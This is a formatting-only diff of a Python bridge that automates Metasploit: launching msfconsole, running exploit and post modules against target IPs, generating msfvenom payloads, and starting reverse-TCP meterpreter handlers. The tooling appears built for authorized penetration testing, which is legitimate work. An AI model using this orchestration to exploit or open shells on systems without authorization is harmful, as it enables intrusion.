@@ -34,6 +34,7 @@ _LOG = logging.getLogger(__name__)
 # Data models
 # ---------------------------------------------------------------------------
 
+
 @dataclass
 class MsfSessionInfo:
     session_id: int
@@ -94,6 +95,7 @@ class MsfModuleResult:
 # Session output parser
 # ---------------------------------------------------------------------------
 
+
 class MsfSessionParser:
     """Parse msfconsole output to extract session information."""
 
@@ -109,16 +111,18 @@ class MsfSessionParser:
             r"(\d+\.\d+\.\d+\.\d+):(\d+)\s*\(([^)]+)\)"
         )
         for match in pattern.finditer(output):
-            sessions.append(MsfSessionInfo(
-                session_id=int(match.group(1)),
-                session_type=match.group(2),
-                platform=match.group(3),
-                local_ip=match.group(4),
-                local_port=int(match.group(5)),
-                target_ip=match.group(6),
-                target_port=int(match.group(7)),
-                info=match.group(8),
-            ))
+            sessions.append(
+                MsfSessionInfo(
+                    session_id=int(match.group(1)),
+                    session_type=match.group(2),
+                    platform=match.group(3),
+                    local_ip=match.group(4),
+                    local_port=int(match.group(5)),
+                    target_ip=match.group(6),
+                    target_port=int(match.group(7)),
+                    info=match.group(8),
+                )
+            )
         return sessions
 
     @staticmethod
@@ -200,6 +204,7 @@ class MsfSessionParser:
 # Msfconsole session
 # ---------------------------------------------------------------------------
 
+
 class MsfconsoleSession:
     """Manages an interactive msfconsole session via tmux."""
 
@@ -225,7 +230,10 @@ class MsfconsoleSession:
 
         # Check if msfconsole is available
         if not shutil.which("msfconsole"):
-            return {"success": False, "error": "msfconsole not found. Install metasploit-framework: apt install metasploit-framework"}
+            return {
+                "success": False,
+                "error": "msfconsole not found. Install metasploit-framework: apt install metasploit-framework",
+            }
 
         # Start msfconsole with quiet mode and no banner
         cmd = "msfconsole -q -n"
@@ -295,7 +303,14 @@ class MsfconsoleSession:
             "output": output,
         }
 
-    def run_module(self, module: str, target_ip: str, options: dict[str, str] | None = None, payload: str = "", wait_seconds: float = 30.0) -> MsfModuleResult:
+    def run_module(
+        self,
+        module: str,
+        target_ip: str,
+        options: dict[str, str] | None = None,
+        payload: str = "",
+        wait_seconds: float = 30.0,
+    ) -> MsfModuleResult:
         """Run a Metasploit module against a target."""
         start_time = time.monotonic()
 
@@ -373,7 +388,9 @@ class MsfconsoleSession:
 
         return self._parser.parse_sessions_list(result["output"])
 
-    def interact_session(self, session_id: int, command: str, wait_seconds: float = 3.0, background_key: str = "background") -> dict[str, Any]:
+    def interact_session(
+        self, session_id: int, command: str, wait_seconds: float = 3.0, background_key: str = "background"
+    ) -> dict[str, Any]:
         """Send a command to a specific meterpreter/shell session.
 
         ``background_key`` is the keystroke used to return to the msfconsole
@@ -458,6 +475,7 @@ class MsfconsoleSession:
 # Payload generator
 # ---------------------------------------------------------------------------
 
+
 class MsfPayloadGenerator:
     """Generate payloads using msfvenom."""
 
@@ -489,10 +507,12 @@ class MsfPayloadGenerator:
 
         cmd_parts = [
             "msfvenom",
-            "-p", f"{platform}/{arch}/{payload_type}",
+            "-p",
+            f"{platform}/{arch}/{payload_type}",
             f"LHOST={lhost}",
             f"LPORT={lport}",
-            "-f", fmt,
+            "-f",
+            fmt,
         ]
 
         if options.strip():
@@ -521,7 +541,9 @@ class MsfPayloadGenerator:
         try:
             proc = subprocess.run(
                 cmd_parts,
-                capture_output=True, text=True, timeout=300,
+                capture_output=True,
+                text=True,
+                timeout=300,
             )
             output = (proc.stdout + "\n" + proc.stderr)[-3000:]
             status = "completed" if proc.returncode == 0 else "failed"
@@ -578,6 +600,7 @@ class MsfPayloadGenerator:
 # Main MetasploitBridge
 # ---------------------------------------------------------------------------
 
+
 class MetasploitBridge:
     """Unified bridge for all Metasploit interactions."""
 
@@ -622,16 +645,14 @@ class MetasploitBridge:
                 "Metasploit session state at %s is corrupt (%s); starting with "
                 "no tracked sessions. The file will be overwritten on the next "
                 "state save.",
-                self._state_path, exc,
+                self._state_path,
+                exc,
             )
 
     def _save_state(self) -> None:
         data = {
             "saved_at": datetime.now(timezone.utc).isoformat(),
-            "sessions": {
-                str(sid): info.to_dict()
-                for sid, info in self._sessions.items()
-            },
+            "sessions": {str(sid): info.to_dict() for sid, info in self._sessions.items()},
         }
         # Atomic write (temp + os.replace, same directory => same filesystem):
         # a plain write_text truncates first, so a crash mid-write would leave
@@ -793,8 +814,16 @@ class MetasploitBridge:
     ) -> dict[str, Any]:
         """Generate a payload using msfvenom."""
         return self._payloads.generate(
-            payload_type, lhost, lport, fmt, platform, arch,
-            options, encoder, iterations, badchars,
+            payload_type,
+            lhost,
+            lport,
+            fmt,
+            platform,
+            arch,
+            options,
+            encoder,
+            iterations,
+            badchars,
         )
 
     def list_payloads(self, platform: str = "", arch: str = "", keyword: str = "") -> list[str]:
@@ -809,8 +838,9 @@ class MetasploitBridge:
 
     # ── Phase 3: recipe catalog + handler orchestration ──
 
-    def run_recipe(self, name: str, target_ip: str = "", session_id: int = 0,
-                   options: dict[str, str] | None = None) -> dict[str, Any]:
+    def run_recipe(
+        self, name: str, target_ip: str = "", session_id: int = 0, options: dict[str, str] | None = None
+    ) -> dict[str, Any]:
         """Dispatch a named MSF recipe (see ``MSF_RECIPES``).
 
         Validates the name, merges caller options over the preset, and routes
@@ -835,12 +865,14 @@ class MetasploitBridge:
             return self.run_post_module(module, sid, opts)
         if kind == "handler":
             lport = int(opts.get("LPORT", "4444"))
-            return self.start_handler(target_ip or "0.0.0.0", lport,
-                                       recipe.get("payload", "windows/meterpreter/reverse_tcp"), opts)
+            return self.start_handler(
+                target_ip or "0.0.0.0", lport, recipe.get("payload", "windows/meterpreter/reverse_tcp"), opts
+            )
         return self.run_exploit(module, target_ip, opts, recipe.get("payload", ""))
 
-    def start_handler(self, lhost: str, lport: int, payload: str,
-                      options: dict[str, str] | None = None) -> dict[str, Any]:
+    def start_handler(
+        self, lhost: str, lport: int, payload: str, options: dict[str, str] | None = None
+    ) -> dict[str, Any]:
         """Start ``exploit/multi/handler`` as a backgrounded job (-j) in the
         persistent msfconsole -- the catch side of a generated payload. ``lhost``
         is the operator callback host (allowlist-gated at the tool layer)."""
@@ -882,11 +914,13 @@ class MetasploitBridge:
             for key, value in options.items():
                 if key.upper() not in ("RHOSTS", "PAYLOAD", "LHOST", "LPORT"):
                     lines.append(f"set {key} {value}")
-        lines.extend([
-            "exploit -z",
-            "sleep 5",
-            "sessions -l",
-        ])
+        lines.extend(
+            [
+                "exploit -z",
+                "sleep 5",
+                "sessions -l",
+            ]
+        )
         return "\n".join(lines)
 
 
